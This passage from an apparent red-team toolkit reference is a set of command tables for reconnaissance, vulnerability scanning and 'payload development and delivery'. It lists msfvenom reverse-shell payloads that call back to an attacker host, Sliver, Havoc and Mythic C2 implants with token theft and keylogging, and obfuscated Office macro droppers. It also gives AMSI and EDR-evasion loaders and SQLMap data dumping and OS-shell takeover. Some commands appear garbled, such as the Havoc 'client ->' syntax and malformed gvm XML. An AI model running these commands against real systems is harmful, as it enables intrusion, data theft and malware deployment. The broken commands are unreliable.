| 6 | Multiple Engines | `uncover -q "{query}" -e shodan,censys,fofa -o /opt/tsec/output/2.9.6_uncover_multi.txt` | TXT |
| 7 | JSON Output | `uncover -q "{query}" -e shodan -json -o /opt/tsec/output/2.9.7_uncover.json` | JSON |
| 8 | Limit Results | `uncover -q "{query}" -e shodan -l {limit} -o /opt/tsec/output/2.9.8_uncover_limited.txt` | TXT |
| 9 | IP Only | `uncover -q "{query}" -e shodan -field ip -o /opt/tsec/output/2.9.9_uncover_ips.txt` | TXT |
| 10 | Full Discovery | `uncover -q "{query}" -e shodan,censys,fofa,hunter -json -o /opt/tsec/output/2.9.10_uncover_full.json` | JSON |

## Tool 2.10 — EyeWitness
*Take screenshots of websites and identify default credentials.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Web Screenshot | `eyewitness --web -f {url_list} -d /opt/tsec/output/2.10.1_eyewitness_web/` | HTML/PNG |
| 2 | Single URL | `eyewitness --web --single {url} -d /opt/tsec/output/2.10.2_eyewitness_single/` | HTML/PNG |
| 3 | RDP Screenshot | `eyewitness --rdp -f {ip_list} -d /opt/tsec/output/2.10.3_eyewitness_rdp/` | PNG |
| 4 | VNC Screenshot | `eyewitness --vnc -f {ip_list} -d /opt/tsec/output/2.10.4_eyewitness_vnc/` | PNG |
| 5 | All Protocols | `eyewitness --web --rdp --vnc -f {ip_list} -d /opt/tsec/output/2.10.5_eyewitness_all/` | ALL |
| 6 | Proxy | `eyewitness --web -f {url_list} --proxy-ip {proxy_ip} --proxy-port {proxy_port} -d /opt/tsec/output/2.10.6_eyewitness_proxy/` | HTML/PNG |
| 7 | No DNS | `eyewitness --web -f {url_list} --no-dns -d /opt/tsec/output/2.10.7_eyewitness_nodns/` | HTML/PNG |
| 8 | Timeout Adjust | `eyewitness --web -f {url_list} --timeout {seconds} -d /opt/tsec/output/2.10.8_eyewitness_timeout/` | HTML/PNG |
| 9 | User Agent | `eyewitness --web -f {url_list} --user-agent "{ua}" -d /opt/tsec/output/2.10.9_eyewitness_ua/` | HTML/PNG |
| 10 | Full Web Capture | `eyewitness --web --rdp --vnc -f {ip_list} --all-protocols --timeout 30 -d /opt/tsec/output/2.10.10_eyewitness_full/` | ALL |

---

# Phase 3: Vulnerability Assessment

> **Identify weaknesses in target systems through automated scanning and manual verification. Confirm findings with proof-of-concept validation.**

---

## Tool 3.1 — Nuclei
*Fast, community-powered vulnerability scanner with 5000+ templates.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Basic Scan | `nuclei -u {target} -o /opt/tsec/output/3.1.1_nuclei_{target}.txt` | TXT |
| 2 | Severity Filter | `nuclei -u {target} -s critical,high -o /opt/tsec/output/3.1.2_nuclei_severe_{target}.txt` | TXT |
| 3 | Template Filter | `nuclei -u {target} -t {template_dir} -o /opt/tsec/output/3.1.3_nuclei_custom_{target}.txt` | TXT |
| 4 | List Scan | `nuclei -l {url_list} -o /opt/tsec/output/3.1.4_nuclei_list.txt` | TXT |
| 5 | JSON Export | `nuclei -u {target} -je -o /opt/tsec/output/3.1.5_nuclei_{target}.json` | JSON |
| 6 | Markdown Report | `nuclei -u {target} -me /opt/tsec/output/3.1.6_nuclei_md_{target}/` | MD |
| 7 | SARIF Export | `nuclei -u {target} -se /opt/tsec/output/3.1.7_nuclei_{target}.sarif` | SARIF |
| 8 | Tags Filter | `nuclei -u {target} -tags cve,rce -o /opt/tsec/output/3.1.8_nuclei_tags_{target}.txt` | TXT |
| 9 | Rate Limit | `nuclei -u {target} -rl 100 -o /opt/tsec/output/3.1.9_nuclei_rate_{target}.txt` | TXT |
| 10 | Full Audit | `nuclei -u {target} -s critical,high,medium -je -me /opt/tsec/output/3.1.10_nuclei_full_{target}` | ALL |

## Tool 3.2 — Nikto
*Comprehensive web server scanner for vulnerabilities and misconfigurations.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Basic Scan | `nikto -h {target} -o /opt/tsec/output/3.2.1_nikto_{target}.txt` | TXT |
| 2 | SSL Scan | `nikto -h {target} -ssl -o /opt/tsec/output/3.2.2_nikto_ssl_{target}.txt` | TXT |
| 3 | Tuning Scan | `nikto -h {target} -Tuning {tune_code} -o /opt/tsec/output/3.2.3_nikto_tuned_{target}.txt` | TXT |
| 4 | CGI Scan | `nikto -h {target} -Cgidirs all -o /opt/tsec/output/3.2.4_nikto_cgi_{target}.txt` | TXT |
| 5 | Mutate | `nikto -h {target} -mutate 3 -o /opt/tsec/output/3.2.5_nikto_mutate_{target}.txt` | TXT |
| 6 | Database Check | `nikto -h {target} -dbcheck -o /opt/tsec/output/3.2.6_nikto_dbcheck_{target}.txt` | TXT |
| 7 | EVasion | `nikto -h {target} -evasion {evasion_code} -o /opt/tsec/output/3.2.7_nikto_evasion_{target}.txt` | TXT |
| 8 | Plugins | `nikto -h {target} -Plugins {plugin} -o /opt/tsec/output/3.2.8_nikto_plugins_{target}.txt` | TXT |
| 9 | Form Auth | `nikto -h {target} -id {user}:{pass} -o /opt/tsec/output/3.2.9_nikto_auth_{target}.txt` | TXT |
| 10 | Full Scan | `nikto -h {target} -ssl -Tuning x 6 -Cgidirs all -Plugins @ALL -o /opt/tsec/output/3.2.10_nikto_full_{target}.txt` | TXT |

## Tool 3.3 — SQLMap
*Automatic SQL injection and database takeover tool.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Basic Test | `sqlmap -u "{url}" --batch -o /opt/tsec/output/3.3.1_sqlmap_{target}.txt` | TXT |
| 2 | DBMS Enum | `sqlmap -u "{url}" --dbs --batch -o /opt/tsec/output/3.3.2_sqlmap_dbs_{target}.txt` | TXT |
| 3 | Tables Enum | `sqlmap -u "{url}" -D {db} --tables --batch -o /opt/tsec/output/3.3.3_sqlmap_tables_{target}.txt` | TXT |
| 4 | Dump Data | `sqlmap -u "{url}" -D {db} -T {table} --dump --batch -o /opt/tsec/output/3.3.4_sqlmap_dump_{target}.txt` | TXT |
| 5 | OS Shell | `sqlmap -u "{url}" --os-shell --batch -o /opt/tsec/output/3.3.5_sqlmap_shell_{target}.txt` | TXT |
| 6 | Risk/Level | `sqlmap -u "{url}" --level 5 --risk 3 --batch -o /opt/tsec/output/3.3.6_sqlmap_deep_{target}.txt` | TXT |
| 7 | Tamper | `sqlmap -u "{url}" --tamper {tamper} --batch -o /opt/tsec/output/3.3.7_sqlmap_tamper_{target}.txt` | TXT |
| 8 | Cookie | `sqlmap -u "{url}" --cookie "{cookie}" --batch -o /opt/tsec/output/3.3.8_sqlmap_cookie_{target}.txt` | TXT |
| 9 | Request File | `sqlmap -r {request_file} --batch -o /opt/tsec/output/3.3.9_sqlmap_request_{target}.txt` | TXT |
| 10 | Full Takeover | `sqlmap -u "{url}" --dbs --tables --dump --os-shell --batch -o /opt/tsec/output/3.3.10_sqlmap_full_{target}.txt` | TXT |

## Tool 3.4 — Commix
*Automated command injection vulnerability testing.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | URL Scan | `commix -u "{url}" --batch -o /opt/tsec/output/3.4.1_commix_{target}.txt` | TXT |
| 2 | POST Data | `commix -u "{url}" --data "{post_data}" --batch -o /opt/tsec/output/3.4.2_commix_post_{target}.txt` | TXT |
| 3 | Cookie | `commix -u "{url}" --cookie "{cookie}" --batch -o /opt/tsec/output/3.4.3_commix_cookie_{target}.txt` | TXT |
| 4 | Header | `commix -u "{url}" --header "{header}" --batch -o /opt/tsec/output/3.4.4_commix_header_{target}.txt` | TXT |
| 5 | Level 3 | `commix -u "{url}" --level 3 --batch -o /opt/tsec/output/3.4.5_commix_level3_{target}.txt` | TXT |
| 6 | Technique | `commix -u "{url}" --technique {tech} --batch -o /opt/tsec/output/3.4.6_commix_tech_{target}.txt` | TXT |
| 7 | OS Shell | `commix -u "{url}" --os-shell --batch -o /opt/tsec/output/3.4.7_commix_shell_{target}.txt` | TXT |
| 8 | Enumeration | `commix -u "{url}" -- enumeration --batch -o /opt/tsec/output/3.4.8_commix_enum_{target}.txt` | TXT |
| 9 | Request File | `commix -r {request_file} --batch -o /opt/tsec/output/3.4.9_commix_request_{target}.txt` | TXT |
| 10 | Full Test | `commix -u "{url}" --level 3 --technique all --os-shell --batch -o /opt/tsec/output/3.4.10_commix_full_{target}.txt` | TXT |

## Tool 3.5 — XSStrike
*Advanced XSS detection and exploitation suite.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Single URL | `xsstrike -u "{url}" -o /opt/tsec/output/3.5.1_xsstrike_{target}.txt` | TXT |
| 2 | Crawl | `xsstrike -u "{url}" --crawl -o /opt/tsec/output/3.5.2_xsstrike_crawl_{target}.txt` | TXT |
| 3 | Fuzz | `xsstrike -u "{url}" --fuzzer -o /opt/tsec/output/3.5.3_xsstrike_fuzz_{target}.txt` | TXT |
| 4 | Params | `xsstrike -u "{url}" --params -o /opt/tsec/output/3.5.4_xsstrike_params_{target}.txt` | TXT |
| 5 | JSON Output | `xsstrike -u "{url}" --json -o /opt/tsec/output/3.5.5_xsstrike_{target}.json` | JSON |
| 6 | Blind XSS | `xsstrike -u "{url}" --blind -o /opt/tsec/output/3.5.6_xsstrike_blind_{target}.txt` | TXT |
| 7 | Path | `xsstrike -u "{url}" --path -o /opt/tsec/output/3.5.7_xsstrike_path_{target}.txt` | TXT |
| 8 | Threads | `xsstrike -u "{url}" --threads 10 -o /opt/tsec/output/3.5.8_xsstrike_threads_{target}.txt` | TXT |
| 9 | File | `xsstrike -u "{url}" --file {payload_file} -o /opt/tsec/output/3.5.9_xsstrike_file_{target}.txt` | TXT |
| 10 | Full Scan | `xsstrike -u "{url}" --crawl --fuzzer --params --blind --threads 20 -o /opt/tsec/output/3.5.10_xsstrike_full_{target}.txt` | TXT |

## Tool 3.6 — DalFox
*Modern, fast XSS vulnerability scanner and exploitation tool.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | URL Scan | `dalfox url {url} -o /opt/tsec/output/3.6.1_dalfox_{target}.txt` | TXT |
| 2 | File Scan | `dalfox file {url_list} -o /opt/tsec/output/3.6.2_dalfox_file.txt` | TXT |
| 3 | Pipe Scan | `cat {url_list} \| dalfox pipe -o /opt/tsec/output/3.6.3_dalfox_pipe.txt` | TXT |
| 4 | Mining | `dalfox url {url} --mining-dom --mining-dict -o /opt/tsec/output/3.6.4_dalfox_mining_{target}.txt` | TXT |
| 5 | Only Custom Payload | `dalfox url {url} --only-custom-payload --custom-payload {payload_file} -o /opt/tsec/output/3.6.5_dalfox_custom_{target}.txt` | TXT |
| 6 | Blind | `dalfox url {url} --blind {blind_url} -o /opt/tsec/output/3.6.6_dalfox_blind_{target}.txt` | TXT |
| 7 | Find SQLi | `dalfox url {url} --grep sqli -o /opt/tsec/output/3.6.7_dalfox_sqli_{target}.txt` | TXT |
| 8 | Format JSON | `dalfox url {url} --format json -o /opt/tsec/output/3.6.8_dalfox_{target}.json` | JSON |
| 9 | WAF Evasion | `dalfox url {url} --waf-evasion -o /opt/tsec/output/3.6.9_dalfox_waf_{target}.txt` | TXT |
| 10 | Full Scan | `dalfox url {url} --mining-dom --mining-dict --waf-evasion --format json -o /opt/tsec/output/3.6.10_dalfox_full_{target}.json` | JSON |

## Tool 3.7 — OpenVAS / GVM
*Full-featured vulnerability scanner with extensive database.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Quick Scan | `gvm-cli socket --xml "<create_target><name>{name}</name><hosts>{target}</hosts></create_target>" > /opt/tsec/output/3.7.1_openvas_target.xml` | XML |
| 2 | Full Scan | `gvm-cli socket --xml "<create_task><name>{task_name}</name><target id='{target_id}'/><config id='daba56c8-73ec-11df-a475-002264764cea'/></create_task>" > /opt/tsec/output/3.7.2_openvas_task.xml` | XML |
| 3 | List Tasks | `gvm-cli socket --xml "<get_tasks/>" > /opt/tsec/output/3.7.3_openvas_tasks.xml` | XML |
| 4 | Get Report | `gvm-cli socket --xml "<get_reports report_id='{report_id}' format_id='c1645568-627a-11e3-a660-406186ea4fc5'/" > /opt/tsec/output/3.7.4_openvas_report.pdf` | PDF |
| 5 | Export XML | `gvm-cli socket --xml "<get_reports report_id='{report_id}' format_id='5057e5cc-b825-11e4-9d0e-28d24461215b'/" > /opt/tsec/output/3.7.5_openvas_report.xml` | XML |
| 6 | Export CSV | `gvm-cli socket --xml "<get_reports report_id='{report_id}' format_id='c1645568-73ec-11df-a475-002264764cea'/" > /opt/tsec/output/3.7.6_openvas_report.csv` | CSV |
| 7 | Start Task | `gvm-cli socket --xml "<start_task task_id='{task_id}'/>" > /opt/tsec/output/3.7.7_openvas_start.xml` | XML |
| 8 | List Results | `gvm-cli socket --xml "<get_results/>" > /opt/tsec/output/3.7.8_openvas_results.xml` | XML |
| 9 | List Targets | `gvm-cli socket --xml "<get_targets/>" > /opt/tsec/output/3.7.9_openvas_targets.xml` | XML |
| 10 | Full Workflow | `gvm-script cli scan-start "Full and fast" {target} > /opt/tsec/output/3.7.10_openvas_full.txt` | TXT |

## Tool 3.8 — Trivy
*Comprehensive vulnerability scanner for containers and infrastructure.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Image Scan | `trivy image {image} -o /opt/tsec/output/3.8.1_trivy_image_{image}.txt` | TXT |
| 2 | FS Scan | `trivy fs {path} -o /opt/tsec/output/3.8.2_trivy_fs_{target}.txt` | TXT |
| 3 | Repo Scan | `trivy repo {repo_url} -o /opt/tsec/output/3.8.3_trivy_repo.txt` | TXT |
| 4 | SBOM | `trivy image {image} --format spdx-json -o /opt/tsec/output/3.8.4_trivy_sbom_{image}.json` | JSON |
| 5 | JSON Output | `trivy image {image} --format json -o /opt/tsec/output/3.8.5_trivy_{image}.json` | JSON |
| 6 | SARIF | `trivy fs {path} --format sarif -o /opt/tsec/output/3.8.6_trivy_{target}.sarif` | SARIF |
| 7 | Severity Filter | `trivy image {image} --severity HIGH,CRITICAL -o /opt/tsec/output/3.8.7_trivy_severe_{image}.txt` | TXT |
| 8 | Ignore Unfixed | `trivy image {image} --ignore-unfixed -o /opt/tsec/output/3.8.8_trivy_fixed_{image}.txt` | TXT |
| 9 | Config Scan | `trivy config {path} -o /opt/tsec/output/3.8.9_trivy_config_{target}.txt` | TXT |
| 10 | Full Scan | `trivy image {image} --severity HIGH,CRITICAL --format json -o /opt/tsec/output/3.8.10_trivy_full_{image}.json` | JSON |

## Tool 3.9 — Grype
*Fast vulnerability scanner for container images and filesystems.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Image Scan | `grype {image} -o /opt/tsec/output/3.9.1_grype_image_{image}.txt` | TXT |
| 2 | SBOM Input | `grype sbom:{sbom_file} -o /opt/tsec/output/3.9.2_grype_sbom.txt` | TXT |
| 3 | JSON Output | `grype {image} -o json > /opt/tsec/output/3.9.3_grype_{image}.json` | JSON |
| 4 | CycloneDX | `grype {image} -o cyclonedx-json > /opt/tsec/output/3.9.4_grype_cyclonedx_{image}.json` | JSON |
| 5 | SARIF | `grype {image} -o sarif > /opt/tsec/output/3.9.5_grype_{image}.sarif` | SARIF |
| 6 | Only Fixed | `grype {image} --only-fixed -o /opt/tsec/output/3.9.6_grype_fixed_{image}.txt` | TXT |
| 7 | Fail On | `grype {image} --fail-on critical -o /opt/tsec/output/3.9.7_grype_critical_{image}.txt` | TXT |
| 8 | Scope Squashed | `grype {image} --scope squashed -o /opt/tsec/output/3.9.8_grype_squashed_{image}.txt` | TXT |
| 9 | Add CPEs | `grype {image} --add-cpes-if-none -o /opt/tsec/output/3.9.9_grype_cpes_{image}.txt` | TXT |
| 10 | Full Scan | `grype {image} --only-fixed -o json > /opt/tsec/output/3.9.10_grype_full_{image}.json` | JSON |

## Tool 3.10 — Wpscan
*WordPress vulnerability scanner with extensive plugin/theme detection.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Basic Scan | `wpscan --url {url} -o /opt/tsec/output/3.10.1_wpscan_{target}.txt` | TXT |
| 2 | Enumerate Plugins | `wpscan --url {url} --enumerate p -o /opt/tsec/output/3.10.2_wpscan_plugins_{target}.txt` | TXT |
| 3 | Enumerate Themes | `wpscan --url {url} --enumerate t -o /opt/tsec/output/3.10.3_wpscan_themes_{target}.txt` | TXT |
| 4 | Enumerate Users | `wpscan --url {url} --enumerate u -o /opt/tsec/output/3.10.4_wpscan_users_{target}.txt` | TXT |
| 5 | Brute Force | `wpscan --url {url} --passwords {wordlist} --usernames {user} -o /opt/tsec/output/3.10.5_wpscan_brute_{target}.txt` | TXT |
| 6 | Aggressive | `wpscan --url {url} --plugins-detection aggressive -o /opt/tsec/output/3.10.6_wpscan_aggro_{target}.txt` | TXT |
| 7 | Vulnerable Only | `wpscan --url {url} --enumerate vp -o /opt/tsec/output/3.10.7_wpscan_vuln_{target}.txt` | TXT |
| 8 | No Update | `wpscan --url {url} --no-update -o /opt/tsec/output/3.10.8_wpscan_noupdate_{target}.txt` | TXT |
| 9 | API Token | `wpscan --url {url} --api-token {token} -o /opt/tsec/output/3.10.9_wpscan_api_{target}.txt` | TXT |
| 10 | Full Enumeration | `wpscan --url {url} --enumerate ap,at,cb,dbe,u,m --plugins-detection aggressive -o /opt/tsec/output/3.10.10_wpscan_full_{target}.txt` | TXT |

---

# Phase 4: Payload Development & Delivery

> **Develop, encode, and deliver payloads for exploitation. Create custom shellcode, implants, and delivery mechanisms tailored to the target environment.**

---

## Tool 4.1 — MSFVenom
*Metasploit payload generator — the Swiss Army knife of payload creation.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Windows Reverse TCP | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o /opt/tsec/output/4.1.1_msfvenom_win_rev.exe` | EXE |
| 2 | Linux Reverse TCP | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o /opt/tsec/output/4.1.2_msfvenom_linux_rev.elf` | ELF |
| 3 | MacOS Reverse TCP | `msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f macho -o /opt/tsec/output/4.1.3_msfvenom_macos_rev.macho` | MACHO |
| 4 | Web Payload PHP | `msfvenom -p php/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o /opt/tsec/output/4.1.4_msfvenom_php_rev.php` | PHP |
| 5 | Web Payload ASPX | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f aspx -o /opt/tsec/output/4.1.5_msfvenom_aspx_rev.aspx` | ASPX |
| 6 | Web Payload JSP | `msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f raw -o /opt/tsec/output/4.1.6_msfvenom_jsp_rev.jsp` | JSP |
| 7 | Python Payload | `msfvenom -p cmd/unix/reverse_python LHOST={lhost} LPORT={lport} -f raw -o /opt/tsec/output/4.1.7_msfvenom_python_rev.py` | PY |
| 8 | Android Payload | `msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o /opt/tsec/output/4.1.8_msfvenom_android_rev.apk` | APK |
| 9 | Encoded Payload | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -e x64/xor -i 5 -f exe -o /opt/tsec/output/4.1.9_msfvenom_encoded.exe` | EXE |
| 10 | List Formats | `msfvenom --list formats > /opt/tsec/output/4.1.10_msfvenom_formats.txt` | TXT |

## Tool 4.2 — Sliver C2
*Modern cross-platform C2 framework with advanced implant generation.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Generate Implant | `sliver-server generate --mtls {lhost}:{lport} --os windows --arch amd64 --save /opt/tsec/output/4.2.1_sliver_implant.exe` | EXE |
| 2 | HTTPS Implant | `sliver-server generate --http https://{lhost} --os linux --arch amd64 --save /opt/tsec/output/4.2.2_sliver_https.elf` | ELF |
| 3 | DNS Implant | `sliver-server generate --dns {domain} --os macos --arch arm64 --save /opt/tsec/output/4.2.3_sliver_dns.macho` | MACHO |
| 4 | Staged Payload | `sliver-server generate stager --lhost {lhost} --lport {lport} --format csharp --save /opt/tsec/output/4.2.4_sliver_stager.cs` | CS |
| 5 | Shellcode | `sliver-server generate --http {lhost}:{lport} --format shellcode --save /opt/tsec/output/4.2.5_sliver_shellcode.bin` | BIN |
| 6 | Service Binary | `sliver-server generate --mtls {lhost}:{lport} --format service --save /opt/tsec/output/4.2.6_sliver_service.exe` | EXE |
| 7 | Shared Library | `sliver-server generate --mtls {lhost}:{lport} --format shared --save /opt/tsec/output/4.2.7_sliver_shared.so` | SO |
| 8 | WireGuard | `sliver-server generate --wg {lhost}:{lport} --os windows --arch amd64 --save /opt/tsec/output/4.2.8_sliver_wg.exe` | EXE |
| 9 | Profile Build | `sliver-server profiles new --mtls {lhost} --http {domain} --format exe,shellcode {profile_name} > /opt/tsec/output/4.2.9_sliver_profile.txt` | TXT |
| 10 | Implant List | `sliver-server implants > /opt/tsec/output/4.2.10_sliver_implants.txt` | TXT |

## Tool 4.3 — Havoc C2
*Modern C2 framework with Demon agent and advanced evasion.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Generate Demon | `./havoc client -> payload generate --profile {profile} --arch x64 --format exe --output /opt/tsec/output/4.3.1_havoc_demon.exe` | EXE |
| 2 | Shellcode Build | `./havoc client -> payload generate --profile {profile} --arch x64 --format shellcode --output /opt/tsec/output/4.3.2_havoc_shellcode.bin` | BIN |
| 3 | DLL Agent | `./havoc client -> payload generate --profile {profile} --arch x64 --format dll --output /opt/tsec/output/4.3.3_havoc_dll.dll` | DLL |
| 4 | Service Binary | `./havoc client -> payload generate --profile {profile} --arch x64 --format service-exe --output /opt/tsec/output/4.3.4_havoc_service.exe` | EXE |
| 5 | PowerShell | `./havoc client -> payload generate --profile {profile} --arch x64 --format powershell --output /opt/tsec/output/4.3.5_havoc_ps1.ps1` | PS1 |
| 6 | Custom Listener | `./havoc client -> listener create --name {name} --protocol http --hosts {lhost} --port {lport} --uris /api/v1,/data > /opt/tsec/output/4.3.6_havoc_listener.txt` | TXT |
| 7 | Sleep Mask | `./havoc client -> payload generate --profile {profile} --sleep-obf --format exe --output /opt/tsec/output/4.3.7_havoc_sleep.exe` | EXE |
| 8 | Token Steal | `./havoc client -> token steal {pid} > /opt/tsec/output/4.3.8_havoc_token.txt` | TXT |
| 9 | Inline Execute | `./havoc client -> shellcode inject {pid} {shellcode_file} > /opt/tsec/output/4.3.9_havoc_inject.txt` | TXT |
| 10 | Full Evasion | `./havoc client -> payload generate --profile {profile} --arch x64 --format exe --sleep-obf --export /opt/tsec/output/4.3.10_havoc_full.exe` | EXE |

## Tool 4.4 — Mythic
*Collaborative red teaming platform with multi-agent support.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Apollo Agent | `mythic-cli install github SpecterOps/apollo && mythic-cli start apollo > /opt/tsec/output/4.4.1_mythic_apollo.txt` | TXT |
| 2 | Poseidon Agent | `mythic-cli install github SpecterOps/poseidon && mythic-cli start poseidon > /opt/tsec/output/4.4.2_mythic_poseidon.txt` | TXT |
| 3 | Payload Create | `mythic-cli payload create --type apollo --c2-profile http --callback-host {lhost} > /opt/tsec/output/4.4.3_mythic_payload.txt` | TXT |
| 4 | Custom C2 | `mythic-cli c2 create --type http --callback-host {lhost} --callback-port {lport} --get-uri /api/data > /opt/tsec/output/4.4.4_mythic_c2.txt` | TXT |
| 5 | Callback Config | `mythic-cli payload create --type poseidon --callback-interval 10 --callback-jitter 20 > /opt/tsec/output/4.4.5_mythic_callback.txt` | TXT |
| 6 | File Upload | `mythic-cli file upload --file {local} --remote {remote_path} > /opt/tsec/output/4.4.6_mythic_upload.txt` | TXT |
| 7 | Screenshot | `mythic-cli action screenshot --payload {payload_id} > /opt/tsec/output/4.4.7_mythic_screenshot.png` | PNG |
| 8 | Token Ops | `mythic-cli action tokens --payload {payload_id} --action steal > /opt/tsec/output/4.4.8_mythic_tokens.txt` | TXT |
| 9 | Keylog Start | `mythic-cli action keylog --payload {payload_id} --action start > /opt/tsec/output/4.4.9_mythic_keylog.txt` | TXT |
| 10 | Full Deploy | `mythic-cli payload create --type apollo --c2-profile http,dns --callback-host {lhost} --format exe,shellcode > /opt/tsec/output/4.4.10_mythic_full.txt` | TXT |

## Tool 4.5 — MacroPack
*Generate obfuscated macros, VBS, and payloads for Office documents.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | VBA Macro | `macro_pack.exe -t {payload_file} -o -G /opt/tsec/output/4.5.1_macropack_macro.doc` | DOC |
| 2 | XLM Macro | `macro_pack.exe -t {payload_file} --xlm -o -G /opt/tsec/output/4.5.2_macropack_xlm.xls` | XLS |
| 3 | DDE Attack | `macro_pack.exe --dde -t {payload_file} -G /opt/tsec/output/4.5.3_macropack_dde.docx` | DOCX |
| 4 | Template Injection | `macro_pack.exe -t {payload_file} --template -G /opt/tsec/output/4.5.4_macropack_template.dotm` | DOTM |
| 5 | HTA Payload | `macro_pack.exe -t {payload_file} --hta -G /opt/tsec/output/4.5.5_macropack_hta.hta` | HTA |
| 6 | SCT File | `macro_pack.exe -t {payload_file} --sct -G /opt/tsec/output/4.5.6_macropack_sct.sct` | SCT |
| 7 | Obfuscation | `macro_pack.exe -t {payload_file} --obfuscate -G /opt/tsec/output/4.5.7_macropack_obf.doc` | DOC |
| 8 | Embed File | `macro_pack.exe -t {payload_file} --embed {embedded} -G /opt/tsec/output/4.5.8_macropack_embed.doc` | DOC |
| 9 | Shortcut LNK | `macro_pack.exe -t {payload_file} --shortcut -G /opt/tsec/output/4.5.9_macropack_shortcut.lnk` | LNK |
| 10 | Full Evasion | `macro_pack.exe -t {payload_file} --xlm --obfuscate --embed {stage2} -G /opt/tsec/output/4.5.10_macropack_full.xls` | XLS |

## Tool 4.6 — Donut
*Convert .NET assemblies to position-independent shellcode.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Basic Generation | `donut -f {assembly}.exe -o /opt/tsec/output/4.6.1_donut_shellcode.bin` | BIN |
| 2 | Class/Method | `donut -f {assembly}.dll -c {class} -m {method} -o /opt/tsec/output/4.6.2_donut_targeted.bin` | BIN |
| 3 | Parameters | `donut -f {assembly}.exe -p '{parameters}' -o /opt/tsec/output/4.6.3_donut_params.bin` | BIN |
| 4 | Entropy Control | `donut -f {assembly}.exe -e 2 -o /opt/tsec/output/4.6.4_donut_entropy.bin` | BIN |
| 5 | Runtime Select | `donut -f {assembly}.exe -r {runtime_dll} -o /opt/tsec/output/4.6.5_donut_runtime.bin` | BIN |
| 6 | AMSI Bypass | `donut -f {assembly}.exe -a 1 -o /opt/tsec/output/4.6.6_donut_amsi.bin` | BIN |
| 7 | WLDP Bypass | `donut -f {assembly}.exe -y 1 -o /opt/tsec/output/4.6.7_donut_wldp.bin` | BIN |
| 8 | Exit Mode | `donut -f {assembly}.exe -x 1 -o /opt/tsec/output/4.6.8_donut_exit.bin` | BIN |
| 9 | Compression | `donut -f {assembly}.exe -z 2 -o /opt/tsec/output/4.6.9_donut_compressed.bin` | BIN |
| 10 | Full Evasion | `donut -f {assembly}.exe -a 1 -y 1 -e 3 -z 2 -o /opt/tsec/output/4.6.10_donut_full.bin` | BIN |

## Tool 4.7 — ScareCrow
*EDR evasion payload creation framework with side-loading.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | Binary Loader | `ScareCrow -I {shellcode}.bin -domain {domain} -delivery binary -o /opt/tsec/output/4.7.1_scarecrow_binary.exe` | EXE |
| 2 | Control Loader | `ScareCrow -I {shellcode}.bin -domain {domain} -delivery control -o /opt/tsec/output/4.7.2_scarecrow_control.cpl` | CPL |
| 3 | Excel Loader | `ScareCrow -I {shellcode}.bin -domain {domain} -delivery excel -o /opt/tsec/output/4.7.3_scarecrow_excel.xll` | XLL |
| 4 | MSI Loader | `ScareCrow -I {shellcode}.bin -domain {domain} -delivery msi -o /opt/tsec/output/4.7.4_scarecrow_msi.msi` | MSI |
| 5 | DLL Loader | `ScareCrow -I {shellcode}.bin -domain {domain} -delivery dll -o /opt/tsec/output/4.7.5_scarecrow_dll.dll` | DLL |
| 6 | EDR Unhook | `ScareCrow -I {shellcode}.bin -domain {domain} -delivery binary -unhook -o /opt/tsec/output/4.7.6_scarecrow_unhook.exe` | EXE |
| 7 | Custom Process | `ScareCrow -I {shellcode}.bin -domain {domain} -injection {process} -o /opt/tsec/output/4.7.7_scarecrow_inject.exe` | EXE |
| 8 | Syscall Obf | `ScareCrow -I {shellcode}.bin -domain {domain} -syscall zww -o /opt/tsec/output/4.7.8_scarecrow_syscall.exe` | EXE |
| 9 | Sandbox Evasion | `ScareCrow -I {shellcode}.bin -domain {domain} -sandbox -o /opt/tsec/output/4.7.9_scarecrow_sandbox.exe` | EXE |
| 10 | Full Evasion | `ScareCrow -I {shellcode}.bin -domain {domain} -delivery binary -unhook -sandbox -syscall direct -o /opt/tsec/output/4.7.10_scarecrow_full.exe` | EXE |

## Tool 4.8 — SharpShooter
*Payload delivery framework for HTA, JS, VBS, and VBA.*

| Mode | Name | Command | Output |
|------|------|---------|--------|
| 1 | HTA Payload | `SharpShooter.py --stageless --dotnetver 4 --payload hta --output /opt/tsec/output/4.8.1_sharpshooter_hta --rawsc {shellcode}.bin` | HTA |
| 2 | JS Payload | `SharpShooter.py --stageless --dotnetver 4 --payload js --output /opt/tsec/output/4.8.2_sharpshooter_js --rawsc {shellcode}.bin` | JS |
| 3 | VBS Payload | `SharpShooter.py --stageless --dotnetver 4 --payload vbs --output /opt/tsec/output/4.8.3_sharpshooter_vbs --rawsc {shellcode}.bin` | VBS |
| 4 | VBA Payload | `SharpShooter.py --stageless --dotnetver 4 --payload vba --output /opt/tsec/output/4.8.4_sharpshooter_vba --rawsc {shellcode}.bin` | VBA |
